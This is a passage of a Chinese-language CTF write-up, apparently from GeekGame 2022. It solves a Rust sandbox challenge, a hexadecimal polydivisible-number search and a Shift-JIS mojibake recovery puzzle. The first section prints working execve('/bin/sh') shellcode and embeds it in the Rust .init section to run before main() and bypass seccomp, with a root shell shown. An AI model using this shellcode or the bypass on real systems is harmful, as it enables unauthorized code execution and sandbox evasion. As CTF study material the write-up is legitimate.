<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/x $rip
0x55bc62a00018 &lt;shellcode&gt;:     0x00000000
</code></pre></div></div>

<p>果然。那就简单了，先搞个 shellcode bytes：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
<span class="sa">b</span><span class="s">'jhH</span><span class="se">\xb8</span><span class="s">/bin///sPH</span><span class="se">\x89\xe7</span><span class="s">hri</span><span class="se">\x01\x01\x81</span><span class="s">4$</span><span class="se">\x01\x01\x01\x01</span><span class="s">1</span><span class="se">\xf6</span><span class="s">Vj</span><span class="se">\x08</span><span class="s">^H</span><span class="se">\x01\xe6</span><span class="s">VH</span><span class="se">\x89\xe6</span><span class="s">1</span><span class="se">\xd2</span><span class="s">j;X</span><span class="se">\x0f\x05</span><span class="s">'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
<span class="nb">KeyboardInterrupt</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> 
<span class="nb">KeyboardInterrupt</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
<span class="p">...</span>     <span class="n">res</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="p">...</span> 
<span class="o">&gt;&gt;&gt;</span> <span class="n">res</span>
<span class="p">[</span><span class="mi">106</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
<span class="mi">48</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
    <span class="o">/*</span> <span class="n">execve</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="s">'/bin///sh'</span><span class="p">,</span> <span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="s">'sh'</span><span class="p">],</span> <span class="n">envp</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="o">*/</span>
    <span class="o">/*</span> <span class="n">push</span> <span class="sa">b</span><span class="s">'/bin///sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mh">0x68</span>
    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x732f2f2f6e69622f</span>
    <span class="n">push</span> <span class="n">rax</span>
    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rsp</span>
    <span class="o">/*</span> <span class="n">push</span> <span class="n">argument</span> <span class="n">array</span> <span class="p">[</span><span class="s">'sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">]</span> <span class="o">*/</span>
    <span class="o">/*</span> <span class="n">push</span> <span class="sa">b</span><span class="s">'sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mh">0x1010101</span> <span class="o">^</span> <span class="mh">0x6873</span>
    <span class="n">xor</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span><span class="p">],</span> <span class="mh">0x1010101</span>
    <span class="n">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span> <span class="o">/*</span> <span class="mi">0</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="n">rsi</span> <span class="o">/*</span> <span class="n">null</span> <span class="n">terminate</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mi">8</span>
    <span class="n">pop</span> <span class="n">rsi</span>
    <span class="n">add</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rsp</span>
    <span class="n">push</span> <span class="n">rsi</span> <span class="o">/*</span> <span class="s">'sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*/</span>
    <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rsp</span>
    <span class="n">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span> <span class="o">/*</span> <span class="mi">0</span> <span class="o">*/</span>
    <span class="o">/*</span> <span class="n">call</span> <span class="n">execve</span><span class="p">()</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="n">SYS_execve</span> <span class="o">/*</span> <span class="mh">0x3b</span> <span class="o">*/</span>
    <span class="n">pop</span> <span class="n">rax</span>
    <span class="n">syscall</span>
</code></pre></div></div>

<p>然后塞到程序里：</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">#![forbid(unsafe_code)]</span>

<span class="nd">#[link_section=</span><span class="s">".init"</span><span class="nd">]</span>
<span class="nd">#[no_mangle]</span>
<span class="k">pub</span> <span class="k">static</span> <span class="n">shellcode</span><span class="p">:</span> <span class="p">[</span><span class="nb">u8</span><span class="p">;</span> <span class="mi">48</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="mi">106</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">];</span>

<span class="k">pub</span> <span class="k">fn</span> <span class="nf">run</span><span class="p">()</span> <span class="p">{</span>
<span class="p">}</span>
</code></pre></div></div>

<p>跑一跑：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@b158b3a007f3:/workspace/home/saferust#</span><span class="w"> </span>cargo run <span class="nt">--release</span>
<span class="go">   Compiling saferust v0.1.0 (/workspace/home/saferust)
    Finished release [optimized] target(s) in 0.16s
     Running `target/release/saferust`
</span><span class="gp">#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span></code></pre></div></div>

<p>成功！因为我们的 shellcode 在 main() 之前运行，所以 seccomp 限制也和我们毫无关系。</p>

<h2 id="381654729">381654729</h2>

<p>可以搜索到，<a href="https://proofwiki.org/wiki/Definition:Polydivisible_Number">381654729 是十进制意义下唯一的每位数字都不同的 Polydivisible number</a>，并且程序似乎是要找个十六进制意义下的 polydivisible number。</p>

<p>找了一下 OEIS，没有找到有那么大的数的序列，我也不太懂算法，最后写了个 DFS 爆破之：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 0x666c616774c84912e26ad72b668ce22d54447a4b6127713f
# 0x000000000f????????????????????????????????????42
</span>
<span class="c1"># 0x000000000f????????????????????????????????????42
</span>
<span class="c1"># flag=input("Flag: ").encode()
# if len(set(flag)-set(range(127)))&gt;0:
#     print("Wrong")
# else:
#import string
</span><span class="n">num</span><span class="o">=</span>       <span class="mh">0xf00000000000000000000000000000000000042</span>
<span class="c1">#remaining= 0xc84912e26ad72b668ce22d54447a4b612771
#printable = string.printable
</span><span class="n">num_len</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">num</span><span class="p">))</span><span class="o">-</span><span class="mi">2</span>

<span class="k">def</span> <span class="nf">dfs</span><span class="p">(</span><span class="n">pos</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">num</span>
    <span class="k">if</span> <span class="n">pos</span> <span class="o">&gt;</span> <span class="n">num_len</span> <span class="o">-</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Find a potential number"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">num_len</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">num</span><span class="o">&gt;&gt;</span><span class="p">((</span><span class="n">num_len</span><span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">))</span><span class="o">%</span><span class="n">i</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"But not expected"</span><span class="p">)</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">flag</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
            <span class="nb">exit</span><span class="p">()</span>
        <span class="k">return</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">num_len</span><span class="o">-</span><span class="n">pos</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">num</span><span class="o">&gt;&gt;</span><span class="p">((</span><span class="n">num_len</span><span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">))</span><span class="o">%</span><span class="n">i</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
            <span class="n">dfs</span><span class="p">(</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">num</span> <span class="o">+=</span> <span class="n">base</span>
    <span class="n">num</span> <span class="o">-=</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">base</span>

<span class="n">dfs</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div></div>

<p>我们都知道输出开头是 <code class="language-plaintext highlighter-rouge">flag{</code>，所以我们的数字的长度也是已知的。DFS 从头开始枚举，跑一会就能出结果：</p>

<p><img src="/pictures/geekgame-2022/381654729.png" alt="Result of 381654729"></p>

<p>剩下要做什么应该不用我多说了。</p>

<h2 id="乱码还原">乱码还原</h2>

<blockquote>
  <p>GitHub Copilot 曰：「佛曰：『我名為阿彌陀佛。』」</p>
</blockquote>

<p><img src="/pictures/geekgame-2022/foyue.png" alt="foyue"></p>

<p>这道题需要还原在 UTF-8 硬转 Shift-JIS 编码后的文字（其中丢失了信息，因为不是所有的序列都是 valid Shift-JIS 字符），并且文字的字符的集合已知。说到这个，我就想到了之前看《街角魔族》第二季第十集里的一个场景（相关的解释我是在<a href="https://bgm.tv/ep/973615">这里</a>看到的）：</p>

<p><img src="/pictures/geekgame-2022/shift_jis_anime1.jpg" alt="Machikado Mazoku S2EP10 Pic1"></p>

<p><img src="/pictures/geekgame-2022/shift_jis_anime2.jpg" alt="Machikado Mazoku S2EP10 Pic2"></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="s">"邢詅裪芩苭芢芢靝苌芲醸諧"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-16be'</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'shift_jis'</span><span class="p">)</span>
<span class="s">'世界一かわいい余のご尊顔'</span>
</code></pre></div></div>

<p>不过……这里不是 UTF-16BE，而是（对于编码用到的字符来说是）三字节的 UTF-8，而且我们必须要面对在转换过程中丢失的信息。</p>

<h3 id="flag-1暴力方法">Flag 1：暴力方法</h3>

<p>试了一下贪心的写法，发现会出现分叉，于是直接写了个 DFS 暴力：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag1.enc"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
	  <span class="n">binary</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
	
	  <span class="k">def</span> <span class="nf">dfs</span><span class="p">(</span><span class="n">sent</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
	      <span class="k">if</span> <span class="n">sent</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'shift_jis'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">)</span> <span class="o">==</span> <span class="n">binary</span><span class="p">:</span>
	          <span class="k">print</span><span class="p">(</span><span class="n">sent</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
	          <span class="nb">exit</span><span class="p">()</span>
	      <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">TUDOU</span><span class="p">:</span>
	          <span class="n">x</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
	          <span class="k">if</span> <span class="n">binary</span><span class="p">.</span><span class="n">startswith</span><span class="p">((</span><span class="n">sent</span> <span class="o">+</span> <span class="n">x</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'shift_jis'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">)):</span>
	              <span class="n">dfs</span><span class="p">(</span><span class="n">sent</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
	      <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">BYTEMARK</span><span class="p">:</span>
	          <span class="n">x</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
	          <span class="k">if</span> <span class="n">binary</span><span class="p">.</span><span class="n">startswith</span><span class="p">((</span><span class="n">sent</span> <span class="o">+</span> <span class="n">x</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'shift_jis'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">)):</span>
	              <span class="n">dfs</span><span class="p">(</span><span class="n">sent</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
	  
	  <span class="n">dfs</span><span class="p">(</span><span class="s">"佛曰："</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
</code></pre></div></div>

<p>出的结果扔到 <code class="language-plaintext highlighter-rouge">Decrypt()</code> 解密即可。</p>

<h3 id="flag-2线性方法">Flag 2：线性方法</h3>

<p>Flag 2 变长了，如果还用 DFS 的代码，即使调整了迭代深度，也会发现迭代越到后面性能越差，因为有了个额外的 <code class="language-plaintext highlighter-rouge">O(n^2)</code> 的惩罚：每次都要对构造出的字符串做一遍 decode 到 shift_jis 的操作。</p>

<p>熬夜写了个线性的算法：每次迭代输出完整的字符，对于可能分叉的情况，对每种可能出现的情况分别处理（再读几个字节看看会不会出问题），最后如果实在出现了分叉，记录下有多种选择的字符的位置。</p>

<p>在写之前输出每个字符的 UTF-8 字节值，以及手推一遍 flag1 可能会有帮助。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag2.enc"</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">tdata</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tdata</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="n">i</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'shift_jis'</span><span class="p">)</span>

<span class="n">TUDOU</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">'滅'</span><span class="p">,</span> <span class="s">'苦'</span><span class="p">,</span> <span class="s">'婆'</span><span class="p">,</span> <span class="s">'娑'</span><span class="p">,</span> <span class="s">'耶'</span><span class="p">,</span> <span class="s">'陀'</span><span class="p">,</span> <span class="s">'跋'</span><span class="p">,</span> <span class="s">'多'</span><span class="p">,</span> <span class="s">'漫'</span><span class="p">,</span> <span class="s">'都'</span><span class="p">,</span> <span class="s">'殿'</span><span class="p">,</span> <span class="s">'悉'</span><span class="p">,</span> <span class="s">'夜'</span><span class="p">,</span> <span class="s">'爍'</span><span class="p">,</span> <span class="s">'帝'</span><span class="p">,</span> <span class="s">'吉'</span><span class="p">,</span>
    <span class="s">'利'</span><span class="p">,</span> <span class="s">'阿'</span><span class="p">,</span> <span class="s">'無'</span><span class="p">,</span> <span class="s">'南'</span><span class="p">,</span> <span class="s">'那'</span><span class="p">,</span> <span class="s">'怛'</span><span class="p">,</span> <span class="s">'喝'</span><span class="p">,</span> <span class="s">'羯'</span><span class="p">,</span> <span class="s">'勝'</span><span class="p">,</span> <span class="s">'摩'</span><span class="p">,</span> <span class="s">'伽'</span><span class="p">,</span> <span class="s">'謹'</span><span class="p">,</span> <span class="s">'波'</span><span class="p">,</span> <span class="s">'者'</span><span class="p">,</span> <span class="s">'穆'</span><span class="p">,</span> <span class="s">'僧'</span><span class="p">,</span>
    <span class="s">'室'</span><span class="p">,</span> <span class="s">'藝'</span><span class="p">,</span> <span class="s">'尼'</span><span class="p">,</span> <span class="s">'瑟'</span><span class="p">,</span> <span class="s">'地'</span><span class="p">,</span> <span class="s">'彌'</span><span class="p">,</span> <span class="s">'菩'</span><span class="p">,</span> <span class="s">'提'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">,</span> <span class="s">'醯'</span><span class="p">,</span> <span class="s">'盧'</span><span class="p">,</span> <span class="s">'呼'</span><span class="p">,</span> <span class="s">'舍'</span><span class="p">,</span> <span class="s">'佛'</span><span class="p">,</span> <span class="s">'參'</span><span class="p">,</span> <span class="s">'沙'</span><span class="p">,</span>
    <span class="s">'伊'</span><span class="p">,</span> <span class="s">'隸'</span><span class="p">,</span> <span class="s">'麼'</span><span class="p">,</span> <span class="s">'遮'</span><span class="p">,</span> <span class="s">'闍'</span><span class="p">,</span> <span class="s">'度'</span><span class="p">,</span> <span class="s">'蒙'</span><span class="p">,</span> <span class="s">'孕'</span><span class="p">,</span> <span class="s">'薩'</span><span class="p">,</span> <span class="s">'夷'</span><span class="p">,</span> <span class="s">'迦'</span><span class="p">,</span> <span class="s">'他'</span><span class="p">,</span> <span class="s">'姪'</span><span class="p">,</span> <span class="s">'豆'</span><span class="p">,</span> <span class="s">'特'</span><span class="p">,</span> <span class="s">'逝'</span><span class="p">,</span>
    <span class="s">'朋'</span><span class="p">,</span> <span class="s">'輸'</span><span class="p">,</span> <span class="s">'楞'</span><span class="p">,</span> <span class="s">'栗'</span><span class="p">,</span> <span class="s">'寫'</span><span class="p">,</span> <span class="s">'數'</span><span class="p">,</span> <span class="s">'曳'</span><span class="p">,</span> <span class="s">'諦'</span><span class="p">,</span> <span class="s">'羅'</span><span class="p">,</span> <span class="s">'曰'</span><span class="p">,</span> <span class="s">'咒'</span><span class="p">,</span> <span class="s">'即'</span><span class="p">,</span> <span class="s">'密'</span><span class="p">,</span> <span class="s">'若'</span><span class="p">,</span> <span class="s">'般'</span><span class="p">,</span> <span class="s">'故'</span><span class="p">,</span>
    <span class="s">'不'</span><span class="p">,</span> <span class="s">'實'</span><span class="p">,</span> <span class="s">'真'</span><span class="p">,</span> <span class="s">'訶'</span><span class="p">,</span> <span class="s">'切'</span><span class="p">,</span> <span class="s">'一'</span><span class="p">,</span> <span class="s">'除'</span><span class="p">,</span> <span class="s">'能'</span><span class="p">,</span> <span class="s">'等'</span><span class="p">,</span> <span class="s">'是'</span><span class="p">,</span> <span class="s">'上'</span><span class="p">,</span> <span class="s">'明'</span><span class="p">,</span> <span class="s">'大'</span><span class="p">,</span> <span class="s">'神'</span><span class="p">,</span> <span class="s">'知'</span><span class="p">,</span> <span class="s">'三'</span><span class="p">,</span>
    <span class="s">'藐'</span><span class="p">,</span> <span class="s">'耨'</span><span class="p">,</span> <span class="s">'得'</span><span class="p">,</span> <span class="s">'依'</span><span class="p">,</span> <span class="s">'諸'</span><span class="p">,</span> <span class="s">'世'</span><span class="p">,</span> <span class="s">'槃'</span><span class="p">,</span> <span class="s">'涅'</span><span class="p">,</span> <span class="s">'竟'</span><span class="p">,</span> <span class="s">'究'</span><span class="p">,</span> <span class="s">'想'</span><span class="p">,</span> <span class="s">'夢'</span><span class="p">,</span> <span class="s">'倒'</span><span class="p">,</span> <span class="s">'顛'</span><span class="p">,</span> <span class="s">'離'</span><span class="p">,</span> <span class="s">'遠'</span><span class="p">,</span>
    <span class="s">'怖'</span><span class="p">,</span> <span class="s">'恐'</span><span class="p">,</span> <span class="s">'有'</span><span class="p">,</span> <span class="s">'礙'</span><span class="p">,</span> <span class="s">'心'</span><span class="p">,</span> <span class="s">'所'</span><span class="p">,</span> <span class="s">'以'</span><span class="p">,</span> <span class="s">'亦'</span><span class="p">,</span> <span class="s">'智'</span><span class="p">,</span> <span class="s">'道'</span><span class="p">,</span> <span class="s">'。'</span><span class="p">,</span> <span class="s">'集'</span><span class="p">,</span> <span class="s">'盡'</span><span class="p">,</span> <span class="s">'死'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">,</span> <span class="s">'至'</span><span class="p">]</span>

<span class="n">BYTEMARK</span> <span class="o">=</span> <span class="p">[</span><span class="s">'冥'</span><span class="p">,</span> <span class="s">'奢'</span><span class="p">,</span> <span class="s">'梵'</span><span class="p">,</span> <span class="s">'呐'</span><span class="p">,</span> <span class="s">'俱'</span><span class="p">,</span> <span class="s">'哆'</span><span class="p">,</span> <span class="s">'怯'</span><span class="p">,</span> <span class="s">'諳'</span><span class="p">,</span> <span class="s">'罰'</span><span class="p">,</span> <span class="s">'侄'</span><span class="p">,</span> <span class="s">'缽'</span><span class="p">,</span> <span class="s">'皤'</span><span class="p">]</span>
<span class="n">FOYUE</span> <span class="o">=</span> <span class="p">[</span><span class="s">"佛"</span><span class="p">,</span> <span class="s">"曰"</span><span class="p">,</span> <span class="s">"："</span><span class="p">]</span>

<span class="n">mappings</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">dict</span><span class="p">))</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">TUDOU</span> <span class="o">+</span> <span class="n">BYTEMARK</span> <span class="o">+</span> <span class="n">FOYUE</span><span class="p">:</span>
    <span class="n">byte</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
    <span class="n">byte0</span><span class="p">,</span> <span class="n">byte1</span><span class="p">,</span> <span class="n">byte2</span> <span class="o">=</span> <span class="n">byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">byte</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">byte</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">mappings</span><span class="p">[</span><span class="n">byte0</span><span class="p">][</span><span class="n">byte1</span><span class="p">][</span><span class="n">byte2</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>

<span class="n">mappings</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">mappings</span><span class="p">)</span>
<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">mappings</span><span class="p">:</span>
    <span class="n">mappings</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">mappings</span><span class="p">[</span><span class="n">key</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">get_shiftjis</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'shift_jis'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">check_prefix</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">tdata</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">get_shiftjis</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>

<span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">res</span> <span class="o">=</span> <span class="s">""</span>

<span class="c1"># replace_list = []
